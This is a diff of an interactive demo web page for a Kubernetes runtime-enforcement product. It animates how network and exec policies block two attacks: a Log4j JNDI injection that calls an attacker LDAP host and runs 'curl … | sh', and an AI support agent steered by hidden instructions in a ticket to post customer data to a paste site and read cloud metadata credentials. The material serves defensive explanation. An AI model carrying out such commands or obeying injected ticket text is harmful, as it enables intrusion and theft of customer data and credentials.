@@ -18,79 +18,87 @@
 button{font:inherit;cursor:pointer}
 .app{position:relative;max-width:460px;margin:0 auto;height:100vh;height:100dvh;display:flex;flex-direction:column;padding:10px 14px calc(10px + env(safe-area-inset-bottom));overflow:hidden}
 @media (min-width:700px){body{display:grid;place-items:center;min-height:100vh}.app{height:min(100dvh,900px);border:1px solid var(--line);border-radius:28px;box-shadow:0 30px 80px rgba(0,0,0,.5)}}
-/* header */
 .top{display:flex;align-items:center;gap:8px;flex:none}
 .brand{display:flex;align-items:center;gap:7px;font-weight:800;font-size:15px}.brand svg{width:22px;height:22px}
 .prog{flex:1;display:flex;gap:4px;margin:0 6px}.prog i{flex:1;height:4px;border-radius:2px;background:var(--line)}.prog i.d{background:#7F8AA0}.prog i.n{background:var(--ink)}
 .meter{display:flex;align-items:center;gap:5px;font:700 11px var(--mono);color:var(--bad)}.meter div{display:flex;gap:2px}.meter span{width:7px;height:12px;border-radius:2px;background:var(--bad);transition:background .6s}.meter span.c{background:var(--ok)}.meter.okm{color:var(--ok)}
 .chap{flex:none;margin:9px 0 6px;display:flex;justify-content:space-between;align-items:center;font:800 11px var(--mono);letter-spacing:.08em;text-transform:uppercase;color:var(--info)}
 .chap em{font-style:normal;color:var(--muted);letter-spacing:0;text-transform:none;font-weight:600}
-/* map */
-.stage{flex:none;position:relative;height:min(46dvh,420px);border:1px solid var(--line);border-radius:16px;background:radial-gradient(120% 90% at 50% 0%,#141B2B 0%,#0E131D 70%);overflow:hidden}
-.stage svg{width:100%;height:100%;display:block}
+/* stage */
+.stage{flex:none;position:relative;height:min(46dvh,420px);border:1px solid var(--line);border-radius:16px;background:radial-gradient(120% 90% at 50% 0%,#141B2B 0%,#0E131D 70%);overflow:hidden;display:flex;flex-direction:column}
+.stage svg{flex:1;min-height:0;width:100%;display:block}
 .stage.fade svg{animation:fin .45s ease}@keyframes fin{from{opacity:0}to{opacity:1}}
-.tag{position:absolute;left:10px;top:9px;font:700 10.5px var(--mono);color:var(--muted)}
-.tagr{position:absolute;right:10px;top:9px;font:700 10.5px var(--mono);color:var(--muted)}
-/* svg parts */
-.nd circle{fill:#141B28;stroke:#5B677D;stroke-width:1.6}.nd text{font:700 11.5px var(--mono);fill:var(--ink)}.nd .sub{font:500 9.5px var(--mono);fill:var(--muted)}
-.nd.att circle{fill:rgba(255,92,92,.28);stroke:var(--bad)}.nd.core circle{fill:rgba(245,185,71,.28);stroke:var(--warn);stroke-width:2.2}.nd.okn circle{fill:rgba(61,214,140,.22);stroke:var(--ok)}
-.nd.dimn{opacity:.35}
-.pod{fill:rgba(110,168,254,.05);stroke:#5B677D;stroke-dasharray:5 4;stroke-width:1.4}.pod.on{stroke:var(--ok);stroke-dasharray:none;stroke-width:2.4;filter:drop-shadow(0 0 6px rgba(61,214,140,.5))}
-.podl{font:700 10px var(--mono);fill:var(--muted)}
-.e{fill:none;stroke-width:1.5}.e.mesh{stroke:var(--bad);opacity:.5}.e.ex{stroke:var(--bad);opacity:.35;stroke-dasharray:3 4}.e.need{stroke:var(--ok);stroke-width:2.2}
-.e.atk{stroke:var(--bad);stroke-width:2.8}.e.run{stroke:var(--info);stroke-width:2.6}.e.alw{stroke:var(--ok);stroke-width:2.6}.e.kept{stroke:var(--bad);stroke-width:2;stroke-dasharray:4 3}
-.e.draw{stroke-dasharray:400;stroke-dashoffset:400;animation:draw .7s ease forwards}@keyframes draw{to{stroke-dashoffset:0}}
-.num{font:800 11px var(--mono);fill:var(--ink)}.numbg{fill:var(--bg);stroke:var(--ink);stroke-width:1.2}
-.xm circle{fill:var(--bg);stroke:var(--ok);stroke-width:2.2}.xm path{stroke:var(--ok);stroke-width:2.4}
-.xb circle{fill:var(--bg);stroke:var(--bad);stroke-width:2.2}.xb path{stroke:var(--bad);stroke-width:2.4}
-.badge rect{fill:#141B28;stroke:var(--line)}.badge text{font:700 10px var(--mono);fill:var(--text)}.badge .k{fill:var(--ok)}.badge .z{fill:var(--bad)}
-.src rect{fill:#141B28;stroke:var(--dim)}.src text{font:700 10px var(--mono);fill:var(--muted)}.src.on rect{stroke:var(--info);fill:rgba(110,168,254,.14)}.src.on text{fill:var(--ink)}
-.chipv rect{rx:5}.chipv text{font:800 9.5px var(--mono)}.chipv.ok rect{fill:rgba(61,214,140,.18);stroke:var(--ok)}.chipv.ok text{fill:var(--ok)}.chipv.ask rect{fill:rgba(245,185,71,.18);stroke:var(--warn)}.chipv.ask text{fill:var(--warn)}.chipv.no rect{fill:rgba(255,92,92,.18);stroke:var(--bad)}.chipv.no text{fill:var(--bad)}
-.dot{fill:var(--info)}
-.cnt{font:800 30px var(--body);fill:var(--ink)}.cntl{font:600 11px var(--mono);fill:var(--muted)}
-.ag{fill:rgba(179,146,240,.22);stroke:var(--prog);stroke-width:1.2}
+.track{flex:none;display:flex;justify-content:center;gap:6px;padding:0 8px 9px}
+.track button{min-width:30px;height:26px;border-radius:13px;border:1px solid var(--line);background:#121826;color:var(--muted);font:800 11.5px var(--mono);padding:0 8px}
+.track button.r{border-color:var(--info);color:var(--info)}.track button.a{border-color:var(--bad);color:#fff;background:rgba(255,92,92,.35)}.track button.b{border-color:var(--ok);color:var(--ok);background:rgba(61,214,140,.12)}.track button.al{border-color:var(--ok);color:var(--ok)}.track button.cur{outline:2px solid var(--ink);outline-offset:1px}
+/* svg */
+.zone{fill:rgba(255,92,92,.07);stroke:rgba(255,92,92,.35);stroke-dasharray:6 5}.zone.ok{fill:rgba(61,214,140,.05);stroke:rgba(61,214,140,.3)}
+.zl{font:800 10px var(--mono);fill:rgba(255,92,92,.8);letter-spacing:.06em}.zl.ok{fill:rgba(61,214,140,.85)}
+.nd .bg{fill:#151C2A;stroke:#5B677D;stroke-width:1.6}.nd text{font:700 12px var(--mono);fill:var(--ink)}.nd .sub{font:600 9.5px var(--mono);fill:var(--muted)}
+.nd .gl{fill:none;stroke:#AAB4C6;stroke-width:1.6;stroke-linecap:round;stroke-linejoin:round}
+.nd.att .bg{fill:rgba(255,92,92,.22);stroke:var(--bad)}.nd.att .gl{stroke:var(--bad)}
+.nd.okn .bg{fill:rgba(61,214,140,.16);stroke:var(--ok)}.nd.okn .gl{stroke:var(--ok)}
+.nd.dimn{opacity:.3}
+.pod{fill:rgba(110,168,254,.06);stroke:#6D7A91;stroke-dasharray:6 4;stroke-width:1.6;transition:all .4s}.pod.on{stroke:var(--ok);stroke-dasharray:none;stroke-width:3;filter:drop-shadow(0 0 7px rgba(61,214,140,.55))}
+.podl{font:800 10.5px var(--mono);fill:var(--muted)}
+.core .bg{fill:rgba(245,185,71,.22);stroke:var(--warn);stroke-width:2.2}
+.pc rect{fill:#151C2A;stroke:#5B677D;stroke-width:1.3}.pc text{font:700 10.5px var(--mono);fill:var(--muted)}
+.pc.a rect{fill:rgba(255,92,92,.35);stroke:var(--bad)}.pc.a text{fill:#fff}
+.pc.b rect{fill:rgba(61,214,140,.14);stroke:var(--ok)}.pc.b text{fill:var(--ok);text-decoration:line-through}
+.pc.ok rect{fill:rgba(61,214,140,.18);stroke:var(--ok)}.pc.ok text{fill:var(--ok)}
+.pc.ask rect{fill:rgba(245,185,71,.18);stroke:var(--warn)}.pc.ask text{fill:var(--warn)}
+.e{fill:none;stroke-width:1.6;stroke-linecap:round}.e.ex{stroke:var(--bad);opacity:.5;stroke-dasharray:3 4}.e.need{stroke:var(--ok);stroke-width:2.4}
+.e.atk{stroke:var(--bad);stroke-width:3}.e.run{stroke:var(--info);stroke-width:3}.e.alw{stroke:var(--ok);stroke-width:3}.e.kept{stroke:var(--bad);stroke-width:2;stroke-dasharray:5 4}
+.e.draw{stroke-dasharray:500;stroke-dashoffset:500;animation:draw .7s ease .55s forwards}@keyframes draw{to{stroke-dashoffset:0}}
+.e.drawn{stroke-dasharray:500;stroke-dashoffset:500;animation:draw .8s ease forwards}
+.pk{fill:#fff;filter:drop-shadow(0 0 4px #fff)}
+.nb circle{fill:var(--bg);stroke:var(--ink);stroke-width:1.3}.nb text{font:800 10.5px var(--mono);fill:var(--ink)}
+.xm{opacity:0;animation:pop .3s ease .75s forwards}@keyframes pop{to{opacity:1}}.xm.now{opacity:1;animation:none}
+.xm circle{fill:var(--bg);stroke:var(--ok);stroke-width:2.4}.xm path{stroke:var(--ok);stroke-width:2.6;stroke-linecap:round}
+.xb circle{fill:var(--bg);stroke:var(--bad);stroke-width:2.4}.xb path{stroke:var(--bad);stroke-width:2.6;stroke-linecap:round}
+.badge rect{fill:#151C2A;stroke:var(--line)}.badge text{font:700 10.5px var(--mono);fill:var(--text)}.badge .k{fill:var(--ok)}.badge .z{fill:var(--bad)}
+.src rect{fill:#151C2A;stroke:var(--dim)}.src text{font:800 10.5px var(--mono);fill:var(--muted)}.src.on rect{stroke:var(--info);fill:rgba(110,168,254,.16)}.src.on text{fill:var(--ink)}
+.flag rect{fill:rgba(255,92,92,.18);stroke:var(--bad)}.flag text{font:800 10px var(--mono);fill:var(--bad)}
+.cnt{font:800 34px var(--body);fill:var(--ink)}.cntl{font:600 11.5px var(--mono);fill:var(--muted)}
+.ag{fill:rgba(179,146,240,.25);stroke:var(--prog);stroke-width:1.2}
 /* text */
 .cap{flex:1;min-height:0;display:flex;flex-direction:column;padding-top:12px}
 .cap h1{font-size:22px;line-height:1.18;margin:0 0 7px;letter-spacing:-.01em}
 .cap p{font-size:15px;line-height:1.45;color:var(--text);margin:0 0 8px}.cap p b{color:var(--ink)}
-.live:has(.tiles){background:none;border:0;padding:0}.live{min-height:52px;border-radius:12px;background:var(--panel);border:1px solid var(--line);padding:9px 12px;font-size:14px;line-height:1.4;color:var(--text);margin-bottom:8px}
-.live b{color:var(--ink)}.live .r{display:block;margin-top:5px;font:700 12px var(--mono);color:var(--ok)}.live .r i{font-style:normal;background:var(--ok);color:var(--bg);border-radius:4px;padding:1px 5px;margin-right:5px}
+.live{border-radius:12px;background:var(--panel);border:1px solid var(--line);padding:9px 12px;font-size:14.5px;line-height:1.4;color:var(--text);margin-bottom:8px}
+.live b{color:var(--ink)}.live .k{display:inline-block;font:800 11px var(--mono);border-radius:5px;padding:1px 6px;margin-right:6px;vertical-align:1px}
+.live .k.a{background:var(--bad);color:#fff}.live .k.b{background:var(--ok);color:var(--bg)}.live .k.r{background:var(--info);color:var(--bg)}.live .k.al{background:var(--ok);color:var(--bg)}
+.live small{display:block;font-size:13px;color:var(--muted);margin-top:2px}
+.live .rule{display:block;margin-top:6px;font:700 12px/1.4 var(--mono);color:var(--ok)}.live .rule i{font-style:normal;background:var(--ok);color:var(--bg);border-radius:4px;padding:1px 5px;margin-right:5px}
 .live .bad{color:var(--bad)}.live .ok{color:var(--ok)}.live .warn{color:var(--warn)}
-.why3{display:flex;flex-direction:column;gap:5px;margin-bottom:6px}.why3 div{display:grid;grid-template-columns:86px 1fr;gap:8px;align-items:baseline}.why3 b{font-size:14px;color:var(--warn)}.why3 span{font-size:13.5px;line-height:1.35;color:var(--text)}
+.why3{display:flex;flex-direction:column;gap:5px}.why3 div{display:grid;grid-template-columns:86px 1fr;gap:8px;align-items:baseline}.why3 b{font-size:14px;color:var(--warn)}.why3 span{font-size:13.5px;line-height:1.35;color:var(--text)}
+.stg div{display:flex;justify-content:space-between;gap:8px;font-size:13.5px;padding:2px 0}.stg .d{color:var(--ok)}.stg .n{color:var(--ink);font-weight:700}.stg .w{color:var(--dim)}
 .spacer{flex:1}
-/* actions */
 .bar{flex:none;display:flex;align-items:center;gap:8px;padding-top:8px}
 .bar .back{background:transparent;border:1px solid var(--line);color:var(--text);border-radius:12px;padding:12px 14px;font-weight:700}
-.bar .act{flex:1;background:var(--ink);color:var(--bg);border:0;border-radius:12px;padding:13px 12px;font-weight:800;font-size:15px;position:relative}
-.bar .act.go{box-shadow:0 0 0 3px rgba(245,185,71,.55)}
-.bar .act:disabled{opacity:.35}
-.bar .next{background:transparent;border:1px solid var(--line);color:var(--ink);border-radius:12px;padding:12px 16px;font-weight:800}
-.bar .next.go{border-color:var(--warn);box-shadow:0 0 0 3px rgba(245,185,71,.35)}
+.bar .act{flex:1;background:var(--ink);color:var(--bg);border:0;border-radius:12px;padding:13px 12px;font-weight:800;font-size:15px}
+.bar .act.go{box-shadow:0 0 0 3px rgba(245,185,71,.6)}.bar .act:disabled{opacity:.35}
+.bar .next{background:transparent;border:1px solid var(--line);color:var(--ink);border-radius:12px;padding:12px 16px;font-weight:800}.bar .next.go{border-color:var(--warn);box-shadow:0 0 0 3px rgba(245,185,71,.35)}
 .det{background:transparent;border:0;color:var(--info);font:700 12.5px var(--mono);padding:0;align-self:flex-start}
 .modep{flex:none;display:flex;justify-content:center;gap:10px;font:600 11px var(--mono);color:var(--muted);padding-top:6px}.modep button{background:transparent;border:0;color:var(--info);font:700 11px var(--mono);padding:0}
-/* sheet */
 .scrim{position:absolute;inset:0;background:rgba(0,0,0,.55);opacity:0;pointer-events:none;transition:opacity .25s}.scrim.on{opacity:1;pointer-events:auto}
 .sheet{position:absolute;left:0;right:0;bottom:0;max-height:78%;background:var(--panel2);border-top:1px solid var(--line);border-radius:18px 18px 0 0;transform:translateY(100%);transition:transform .3s ease;display:flex;flex-direction:column}
 .sheet.on{transform:none}.sh{display:flex;justify-content:space-between;align-items:center;padding:12px 14px;border-bottom:1px solid var(--line)}.sh b{font-size:15px}.sh button{background:transparent;border:1px solid var(--line);color:var(--ink);border-radius:8px;padding:6px 10px;font-weight:700}
 .sb{overflow:auto;padding:12px 14px 20px;font-size:14px;line-height:1.45;color:var(--text)}.sb h4{margin:12px 0 5px;font:800 11px var(--mono);letter-spacing:.05em;text-transform:uppercase;color:var(--info)}.sb h4:first-child{margin-top:0}
 .sb pre{margin:0;padding:9px 10px;border-radius:8px;background:#0B0F17;border:1px solid var(--line);font:500 11.5px/1.5 var(--mono);color:var(--ink);overflow-x:auto;white-space:pre}
-.sb table{width:100%;border-collapse:collapse;font:600 12px var(--mono)}.sb td{padding:5px 4px;border-bottom:1px solid var(--line)}.sb td:last-child{text-align:right}.sb .g{color:var(--ok)}.sb .y{color:var(--warn)}.sb .x{color:var(--bad)}.sb a{color:var(--info)}
-/* cover */
-.cover{position:absolute;inset:0;background:var(--bg);z-index:5;display:flex;flex-direction:column;padding:22px 18px calc(18px + env(safe-area-inset-bottom))}
+.sb table{width:100%;border-collapse:collapse;font:600 12px var(--mono)}.sb td{padding:5px 4px;border-bottom:1px solid var(--line);vertical-align:top}.sb td:last-child{text-align:right}.sb .g{color:var(--ok)}.sb .y{color:var(--warn)}.sb .x{color:var(--bad)}.sb a{color:var(--info)}
+.cover{position:absolute;inset:0;background:var(--bg);z-index:5;display:flex;flex-direction:column;padding:22px 18px calc(18px + env(safe-area-inset-bottom))}.cover[hidden]{display:none}
 .cover .k{font:800 11px var(--mono);letter-spacing:.1em;color:var(--info);text-transform:uppercase;margin-top:6px}
 .cover h1{font-size:30px;line-height:1.1;margin:8px 0 12px;letter-spacing:-.02em}
 .cover .msg{font-size:16.5px;line-height:1.45;color:var(--text);margin:0 0 14px}.cover .msg b{color:var(--ink)}
-.cover .mini{flex:1;min-height:150px;border:1px solid var(--line);border-radius:16px;overflow:hidden;background:radial-gradient(120% 90% at 50% 0%,#141B2B 0%,#0E131D 70%)}
-.cover .mini svg{width:100%;height:100%}
+.cover .mini{flex:1;min-height:150px;border:1px solid var(--line);border-radius:16px;overflow:hidden;background:radial-gradient(120% 90% at 50% 0%,#141B2B 0%,#0E131D 70%)}.cover .mini svg{width:100%;height:100%}
 .cover .btns{display:flex;flex-direction:column;gap:8px;margin-top:14px}
-.cover .btns button{border-radius:14px;padding:15px;font-weight:800;font-size:16px;border:0;background:var(--ink);color:var(--bg)}
-.cover .btns button.sec{background:transparent;border:1px solid var(--line);color:var(--ink)}
+.cover .btns button{border-radius:14px;padding:15px;font-weight:800;font-size:16px;border:0;background:var(--ink);color:var(--bg)}.cover .btns button.sec{background:transparent;border:1px solid var(--line);color:var(--ink)}
 .cover .btns small{display:block;font:600 11.5px var(--mono);opacity:.65;margin-top:3px}
 .cover .foot{font:600 11px var(--mono);color:var(--muted);text-align:center;margin-top:10px}
-.cover[hidden]{display:none}
-/* close */
 .tiles{display:grid;grid-template-columns:1fr 1fr;gap:6px}.tiles div{border:1px solid var(--line);background:var(--panel);border-radius:10px;padding:6px 9px}.tiles span{display:block;font:600 11px var(--mono);color:var(--muted)}.tiles b{font-size:20px}.tiles s{color:var(--bad);font-size:15px;margin-right:5px}.tiles .g{color:var(--ok)}
-@media (max-height:700px){.stage{height:40dvh}.cap h1{font-size:19px}.cap p{font-size:13.5px}.live{font-size:13px;min-height:44px}.cover h1{font-size:25px}.cover .msg{font-size:14.5px}}
+.live:has(.tiles){background:none;border:0;padding:0}
+@media (max-height:700px){.stage{height:41dvh}.cap h1{font-size:19px}.cap p{font-size:13.5px}.live{font-size:13px}.cover h1{font-size:25px}.cover .msg{font-size:14.5px}}
 </style>
 </head>
 <body>
@@ -101,7 +109,7 @@ button{font:inherit;cursor:pointer}
     <div class="meter" id="meter" title="attack surface: 7 layers"></div>
   </div>
   <div class="chap" id="chap"></div>
-  <div class="stage" id="stage"><svg id="map" viewBox="0 0 360 300" preserveAspectRatio="xMidYMid meet"></svg><span class="tag" id="tag"></span><span class="tagr" id="tagr"></span></div>
+  <div class="stage" id="stage"><svg id="map" viewBox="0 0 360 290" preserveAspectRatio="xMidYMid meet"></svg><div class="track" id="track"></div></div>
   <div class="cap" id="cap"></div>
   <div class="bar"><button class="back" id="back">Back</button><button class="act" id="act"></button><button class="next" id="next">Next</button></div>
   <div class="modep" id="modep"></div>
@@ -111,8 +119,8 @@ button{font:inherit;cursor:pointer}
     <div class="k">Safety Layer</div>
     <h1>The decision layer for runtime enforcement</h1>
     <p class="msg">Every cluster has the engines to enforce least privilege. <b>Nobody can safely decide the rules.</b> We decide them from evidence, and prove they won't break production.</p>
-    <div class="mini"><svg id="coverMap" viewBox="0 0 360 300" preserveAspectRatio="xMidYMid meet"></svg></div>
-    <div class="btns"><button id="watch">Watch the story<small>about 90 seconds · plays by itself</small></button><button class="sec" id="explore">Explore step by step<small>tap through · open the evidence</small></button></div>
+    <div class="mini"><svg id="coverMap" viewBox="0 0 360 290" preserveAspectRatio="xMidYMid meet"></svg></div>
+    <div class="btns"><button id="watch">Watch the story<small>about 2 minutes · plays by itself</small></button><button class="sec" id="explore">Explore step by step<small>at your pace · open the evidence</small></button></div>
     <div class="foot">Kubernetes · eBPF (Cilium, Tetragon) · lab data from a real namespace</div>
   </section>
 </div>
@@ -121,196 +129,231 @@ const $=id=>document.getElementById(id);
 const reduce=matchMedia('(prefers-reduced-motion: reduce)').matches;
 let timers=[]; const later=(ms,f)=>timers.push(setTimeout(f,reduce?Math.min(ms,50):ms)); const stop=()=>{ timers.forEach(clearTimeout); timers=[]; };
 
-// ---------- the map
-const APP={att:[44,46,'attacker','internet','att'],api:[316,46,'K8s API','','n'],fe:[44,158,'frontend','','n'],java:[172,150,'java','adservice','core'],
-  sh:[222,122,'curl','','n'],root:[222,182,'root','','n'],dns:[96,262,'kube-dns','','n'],ck:[318,112,'checkout','','n'],ct:[318,182,'cart','','n'],rd:[292,262,'redis-cart','','n'],py:[188,262,'payment','','n']};
-const AGT={att:[44,46,'paste site','internet','att'],api:[316,46,'metadata','169.254.169.254','n'],fe:[44,158,'ticket','mcp-tickets','n'],java:[172,150,'python','support-agent','core'],
-  sh:[222,122,'curl','','n'],root:[222,182,'root','','n'],dns:[96,262,'kube-dns','','n'],ck:[318,112,'LLM API','allowed','okn'],ct:[318,182,'cart','','n'],rd:[292,262,'redis-cart','','n'],py:[188,262,'payment','','n']};
-const POD=[128,92,128,120];
-const NEED=[['fe','java'],['java','dns'],['fe','ck'],['fe','ct'],['ck','py'],['ck','ct'],['ct','rd']];
-const OUT=['att','api','fe','ck','ct','rd','py','dns'];
-function P(N,k){ return N[k]; }
-function seg(N,a,b,r1=13,r2=15){ const [x1,y1]=N[a],[x2,y2]=N[b]; const dx=x2-x1,dy=y2-y1,L=Math.hypot(dx,dy),ux=dx/L,uy=dy/L; return [x1+ux*r1,y1+uy*r1,x2-ux*r2,y2-uy*r2]; }
-function edge(N,a,b,cls,{num,draw,mark}={}){ const [x1,y1,x2,y2]=seg(N,a,b); let s=`<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" class="e ${cls} ${draw?'draw':''}" ${mark?`marker-end="url(#m-${mark})"`:''}/>`;
-  if(num){ const mx=(x1+x2)/2,my=(y1+y2)/2; s+=`<circle cx="${mx}" cy="${my}" r="8" class="numbg"/><text x="${mx}" y="${my+3.5}" text-anchor="middle" class="num">${num}</text>`; } return s; }
-function blocked(N,a,b,{num,frac=.55,green=true}={}){ const [x1,y1,x2,y2]=seg(N,a,b); const mx=x1+(x2-x1)*frac,my=y1+(y2-y1)*frac;
-  return `<line x1="${x1}" y1="${y1}" x2="${mx}" y2="${my}" class="e atk draw"/><g class="${green?'xm':'xb'}"><circle cx="${mx}" cy="${my}" r="9"/><path d="M${mx-4.5} ${my-4.5}L${mx+4.5} ${my+4.5}M${mx+4.5} ${my-4.5}L${mx-4.5} ${my+4.5}"/></g>${num?`<text x="${mx}" y="${my-13}" text-anchor="middle" class="num">${num}</text>`:''}`; }
-function nodes(N,{dim=[]}={}){ return Object.entries(N).map(([k,[x,y,l,sub,c]])=>`<g class="nd ${c} ${dim.includes(k)?'dimn':''}"><circle cx="${x}" cy="${y}" r="11"/><text x="${x}" y="${y+25}" text-anchor="middle">${l}</text>${sub?`<text x="${x}" y="${y+36}" text-anchor="middle" class="sub">${sub}</text>`:''}</g>`).join(''); }
-function pod(label,on){ const [x,y,w,h]=POD; return `<rect x="${x}" y="${y}" width="${w}" height="${h}" rx="14" class="pod ${on?'on':''}"/><text x="${x+8}" y="${y+14}" class="podl">${label}</text>`; }
-const DEFS=`<defs>${['atk','run','alw'].map(c=>`<marker id="m-${c}" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5.5" markerHeight="5.5" orient="auto"><path d="M0 0L10 5L0 10z" fill="${c==='atk'?'#FF5C5C':c==='run'?'#6EA8FE':'#3DD68C'}"/></marker>`).join('')}</defs>`;
-function mesh(N){ return OUT.map(k=>edge(N,'java',k,'mesh')).join('')+NEED.filter(([a,b])=>a!=='java'&&b!=='java').map(([a,b])=>edge(N,a,b,'mesh')).join('')+[['fe','rd'],['py','ct'],['ck','rd'],['fe','py']].map(([a,b])=>edge(N,a,b,'mesh')).join(''); }
-function decided(N,showEx=true){ const ex=OUT.filter(k=>k!=='fe'&&k!=='dns'); return (showEx?ex.map(k=>edge(N,'java',k,'ex')).join(''):'')+NEED.map(([a,b])=>edge(N,a,b,'need')).join(''); }
+// ---------- glyphs
+function glyph(t,x,y){ const g=(d)=>`<path class="gl" d="${d}"/>`;
+  if(t==='net') return `<circle class="gl" cx="${x}" cy="${y}" r="7"/><ellipse class="gl" cx="${x}" cy="${y}" rx="3.2" ry="7"/>`+g(`M${x-7} ${y}H${x+7}`);
+  if(t==='api') return `<circle class="gl" cx="${x}" cy="${y}" r="6.5"/><circle class="gl" cx="${x}" cy="${y}" r="2"/>`+[0,60,120,180,240,300].map(a=>{ const r=a*Math.PI/180; return g(`M${x+Math.cos(r)*2.5} ${y+Math.sin(r)*2.5}L${x+Math.cos(r)*8.5} ${y+Math.sin(r)*8.5}`); }).join('');
+  if(t==='db') return `<ellipse class="gl" cx="${x}" cy="${y-5}" rx="7" ry="2.6"/>`+g(`M${x-7} ${y-5}V${y+5}A7 2.6 0 0 0 ${x+7} ${y+5}V${y-5}`)+g(`M${x-7} ${y}A7 2.6 0 0 0 ${x+7} ${y}`);
+  if(t==='app') return `<rect class="gl" x="${x-7}" y="${y-6}" width="14" height="12" rx="2"/>`+g(`M${x-7} ${y-2}H${x+7}`);
+  if(t==='skull') return g(`M${x} ${y-7}L${x+7} ${y+6}H${x-7}Z`)+g(`M${x} ${y-2}V${y+1.5}`)+`<circle cx="${x}" cy="${y+3.8}" r=".9" fill="#FF5C5C"/>`;
+  if(t==='ai') return g(`M${x} ${y-7}L${x+2} ${y-2}L${x+7} ${y}L${x+2} ${y+2}L${x} ${y+7}L${x-2} ${y+2}L${x-7} ${y}L${x-2} ${y-2}Z`);
+  if(t==='doc') return `<rect class="gl" x="${x-5.5}" y="${y-7}" width="11" height="14" rx="1.5"/>`+g(`M${x-3} ${y-3}H${x+3}M${x-3} ${y}H${x+3}M${x-3} ${y+3}H${x+1}`);
+  return ''; }
+function node(x,y,label,sub,ic,cls=''){ return `<g class="nd ${cls}"><circle class="bg" cx="${x}" cy="${y}" r="15"/>${glyph(ic,x,y)}<text x="${x}" y="${y+29}" text-anchor="middle">${label}</text>${sub?`<text x="${x}" y="${y+40}" text-anchor="middle" class="sub">${sub}</text>`:''}</g>`; }
+function exitRect(x1,y1,x2,y2,R){ const [rx,ry,rw,rh]=R; let tmin=1; const tryT=t=>{ if(t>0&&t<tmin){ const x=x1+(x2-x1)*t,y=y1+(y2-y1)*t; if(x>=rx-.1&&x<=rx+rw+.1&&y>=ry-.1&&y<=ry+rh+.1) tmin=t; } };
+  if(x2!==x1){ tryT((rx-x1)/(x2-x1)); tryT((rx+rw-x1)/(x2-x1)); } if(y2!==y1){ tryT((ry-y1)/(y2-y1)); tryT((ry+rh-y1)/(y2-y1)); } return [x1+(x2-x1)*tmin,y1+(y2-y1)*tmin]; }
+function trim(a,b,r1=18,r2=20){ const [x1,y1]=a,[x2,y2]=b,dx=x2-x1,dy=y2-y1,L=Math.hypot(dx,dy),ux=dx/L,uy=dy/L; return [x1+ux*r1,y1+uy*r1,x2-ux*r2,y2-uy*r2]; }
+const DEFS=`<defs>${[['atk','#FF5C5C'],['run','#6EA8FE'],['alw','#3DD68C']].map(([c,f])=>`<marker id="m-${c}" viewBox="0 0 10 10" refX="7" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M0 0L10 5L0 10z" fill="${f}"/></marker>`).join('')}</defs>`;
+const nb=(x,y,n)=>`<g class="nb"><circle cx="${x}" cy="${y}" r="9"/><text x="${x}" y="${y+3.8}" text-anchor="middle">${n}</text></g>`;
+const xmark=(x,y,ok=true,now=false)=>`<g class="xm ${ok?'':'xb'} ${now?'now':''}"><circle cx="${x}" cy="${y}" r="10"/><path d="M${x-4.5} ${y-4.5}L${x+4.5} ${y+4.5}M${x+4.5} ${y-4.5}L${x-4.5} ${y+4.5}"/></g>`;
+// an action along a line: a packet travels, then the line stays. blocked: stops at the pod wall
+function action(a,b,cls,{n,fresh,stopAt}={}){ let [x1,y1,x2,y2]=trim(a,b); let bx,by;
+  if(stopAt){ [bx,by]=exitRect(x1,y1,x2,y2,stopAt); x2=bx; y2=by; }
+  const mk=stopAt?'':`marker-end="url(#m-${cls})"`;
+  let s=`<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" class="e ${cls} ${fresh?'draw':''}" ${mk}/>`;
+  if(fresh&&!reduce) s+=`<circle r="4.5" class="pk" cx="${x1}" cy="${y1}"><animate attributeName="cx" from="${x1}" to="${x2}" dur=".75s" fill="freeze"/><animate attributeName="cy" from="${y1}" to="${y2}" dur=".75s" fill="freeze"/><animate attributeName="opacity" values="1;1;0" keyTimes="0;.85;1" dur=".9s" fill="freeze"/></circle>`;
+  if(stopAt) s+=xmark(bx,by,true,!fresh);
+  if(n){ let mx=(x1+x2)/2, my=(y1+y2)/2; if(stopAt){ const [ax,ay]=b,dx=ax-bx,dy=ay-by,L=Math.hypot(dx,dy)||1; mx=bx+dx/L*20; my=by+dy/L*20; } s+=nb(mx,my,n); }
+  return s; }
 
-// ---------- the attack
-const ATK=[['fe','java','run','Request arrives with <b>${jndi:ldap://attacker…}</b> in a header','frontend → adservice:9555 is a path it really needs'],
-  ['java','att','atk','Log4j calls <b>ldap://attacker:1389</b> and loads the attacker’s class','remote code is now running in adservice','Cilium','adservice egress: kube-dns:53 only → DROP. The call never connects, so no class is loaded.'],
-  ['java','sh','atk','The class runs <b>curl … | sh</b>','more tools downloaded','Tetragon','exec allow-list for adservice: 8 programs. curl is not one → blocked.'],
-  ['java','api','atk','It calls the <b>K8s API</b> with the pod’s token','read secrets, start pods','Cilium','kube-apiserver not in adservice egress → DROP.'],
-  ['java','rd','atk','It connects to <b>redis-cart:6379</b>','every customer’s cart','Cilium','redis-cart not in adservice egress → DROP.'],
-  ['java','root','atk','It tries to become <b>root</b>','setuid, new capabilities','securityContext','allowPrivilegeEscalation: false · capabilities: drop ALL.']];
-const AGA=[['fe','java','run','The agent reads a ticket with <b>hidden instructions</b>','reading tickets is its job'],
-  ['java','ck','alw','The model decides to follow them','the LLM API is in its profile, so the call is allowed. Judging content is the gateway’s job.'],
-  ['java','att','atk','It posts customer data to a <b>paste site</b>','paste.example.net:443','Cilium','egress: LLM API + mcp-tickets only → DROP.'],
-  ['java','sh','atk','Its shell tool runs <b>curl … | sh</b>','downloads and runs a script','Tetragon','exec allow-list: python only → blocked.'],
-  ['java','api','atk','It reads <b>cloud credentials</b>','instance metadata service','Cilium','169.254.169.254 not in its egress → DROP.']];
+// ---------- scene A: the attack (few nodes, big)
+const A={pod:[110,92,140,150], core:[180,138]};
+const AN={app:{att:[52,48,'attacker','internet','skull','att'],api:[308,48,'K8s API','','api',''],fe:[46,170,'frontend','','app',''],rd:[314,196,'redis-cart','customer carts','db','']},
+          agent:{att:[52,48,'paste site','internet','net',''],api:[308,48,'metadata','cloud credentials','api',''],fe:[46,170,'ticket','MCP tool','doc',''],rd:[314,170,'LLM API','in its profile','ai','okn']}};
+function procs(list){ // chips inside the pod
+  const w=list.length===3?40:44, gap=6, tot=list.length*w+(list.length-1)*gap, x0=180-tot/2, y=196;
